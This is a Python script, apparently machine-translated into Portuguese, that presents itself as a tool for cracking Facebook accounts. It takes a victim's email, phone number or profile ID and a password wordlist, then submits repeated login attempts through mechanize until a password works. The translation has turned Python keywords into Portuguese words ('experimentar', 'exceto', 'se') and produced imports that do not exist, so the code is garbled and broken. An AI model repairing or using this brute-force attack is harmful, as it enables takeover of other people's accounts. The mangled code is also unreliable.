import setter
import sys
import experimentar

print ("Nota: - Esta ferramenta pode decifrar a conta do facebook, mesmo que você não tenha o e-mail da sua vítima")
print ("# Pressione CTRL + C para sair do programa")
print("# Use www.graph.facebook.com para mais informações sobre sua vítima ^ _ ^")


email = str (raw_input ("# Enter | Email | | Número de telefone | | Número de ID do perfil | | Nome de usuário |:"))
passwordlist = str (raw_input ("Digite o nome do arquivo da lista de senhas:"))

useragents = [('User-agent', 'Mozilla / 5.0 (X11; U; Linux i686; pt-BR; rv: 1.9.0.1) Gecko / 2008071615 Fedora / 3.0.1-1.fc9 Firefox / 3.0.1' )]



login = 'https://www.facebook.com/login.php?login_attempt=1'
def ataque (senha):

  experimentar:
     sys.stdout.write ("\ r [*] tentando% s .."% password)
     sys.stdout.flush ()
     br.addheaders = [('User-agent', random.choice (useragents))]]
     site = br.open (login)
     br.select_form (nr = 0)

      
     ##Facebook
     br.form ['email'] = email
     br.form ['pass'] = senha
     br.submit ()
     log = br.geturl ()
     se log! = login:
        print "\ n \ n \ n [*] Senha encontrada .. !!"
        print "\ n [*] Senha:% s \ n"% (senha)
        sys.exit (1)
  exceto KeyboardInterrupt:
        print "\ n [*] Saindo do programa .."
        sys.exit (1)

def search ():
    senha global
    para senha nas senhas:
        ataque (password.replace ("\ n", ""))



def check ():

    br global
    senhas globais
    experimentar:
       br = mechanize.Browser ()
       cj = cookielib.LWPCookieJar ()
       br.set_handle_robots (Falso)
       br.set_handle_equiv (Verdadeiro)
       br.set_handle_referer (True)
       br.set_handle_redirect (True)
       br.set_cookiejar (cj)
       br.set_handle_refresh (mechanize._http.HTTPRefreshProcessor (), max_time = 1)
    exceto KeyboardInterrupt:
       print "\ n [*] Saindo do programa .. \ n"
       sys.exit (1)
    experimentar:
       list = open (passwordlist, "r")
       senhas = list.readlines ()
       k = 0
       enquanto k <len (senhas):
          senhas [k] = senhas [k] .strip ()
          k + = 1
    exceto IOError:
        print "\ n [*] Erro: verifique o caminho da sua lista de senhas \ n"
        sys.exit (1)
    exceto KeyboardInterrupt:
        print "\ n [*] Saindo do programa .. \ n"
        sys.exit (1)
    experimentar:
        imprimir GHT
        print "[*] Conta para crackear:% s"% (email)
        print "[*] Loaded:", len (senhas), "senhas"
        print "[*] Cracking, por favor aguarde ..."
    exceto KeyboardInterrupt:
        print "\ n [*] Saindo do programa .. \ n"
        sys.exit (1)
    experimentar:
        pesquisa()
        ataque (senha)
    exceto KeyboardInterrupt:
        print "\ n [*] Saindo do programa .. \ n"
        sys.exit (1)

se __name__ == '__main__':
    Verifica()